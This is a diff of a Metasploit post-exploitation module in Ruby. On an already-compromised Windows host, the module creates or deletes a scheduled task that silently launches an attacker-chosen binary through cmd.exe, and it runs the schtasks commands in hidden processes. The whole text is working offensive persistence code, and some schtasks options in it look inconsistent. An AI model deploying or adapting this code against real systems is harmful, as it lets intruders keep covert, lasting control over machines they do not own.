@@ -42,25 +42,25 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		migrate 
-			
+		migrate unless !datastore['MIGRATE'] 
 		if datastore['DISABLE']
 			print_status "Disabling scheduled task..."
-			
+			disable_task(datastore["TASKNAME"])
 		else
 			print_status "Enabling scheduled task..."
+			enable_task(datastore["TASKNAME"])
 		end
 	end
 
 	def enable_task(name=nil,count=0)
-		task_name = datastore["TASKNAME"] unless name
+		task_name = datastore["TASKNAME"]
 		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start #{datastore["Binary"]}\" /SC ONEVENT /I #{datastore['INTERVAL']}"
 		print_status "Running #{target}"
 		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
 	end
 
 	def disable_task(name=nil,count=0)
-		task_name = datastore["TASKNAME"] unless name
+		task_name = datastore["TASKNAME"]
 		target = "schtasks.exe /DELETE /F /TN #{task_name}"
 		print_status "Running #{target}"
 		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
